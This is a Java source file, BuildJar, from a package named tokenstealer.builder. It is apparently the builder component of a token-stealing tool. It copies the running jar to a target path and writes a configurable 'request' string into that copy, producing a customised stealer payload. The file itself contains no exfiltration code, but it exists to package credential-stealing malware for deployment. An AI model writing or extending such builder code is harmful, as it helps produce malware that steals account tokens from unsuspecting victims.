package de.romjaki.tokenstealer.builder;

import java.io.File;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.nio.file.*;
import java.util.HashMap;


public class BuildJar {
    static void buildJar(String request, File target) {
        if (target == null) return;
        try {
            Files.copy(
                    Paths.get(getCurrentJar()),
                    Paths.get(target.toURI()),
                    StandardCopyOption.REPLACE_EXISTING
            );
        } catch (URISyntaxException | IOException e) {
            e.printStackTrace();
            return;
        }
        URI fileUri = target.toURI();
        try (FileSystem fs =
                     FileSystems.newFileSystem(
                             new URI("jar:" + fileUri.getScheme(), fileUri.getPath(), null),
                             new HashMap<String, String>() {{
                                 put("create", "false");
                             }},
                             null)) {
            Path path = fs.getPath("/request");
            Files.write(path, request.getBytes());
        } catch (IOException | URISyntaxException e) {
            e.printStackTrace();
        }

    }

    private static URI getCurrentJar() throws URISyntaxException {
        return BuildJar.class.getProtectionDomain().getCodeSource().getLocation().toURI();
    }
}
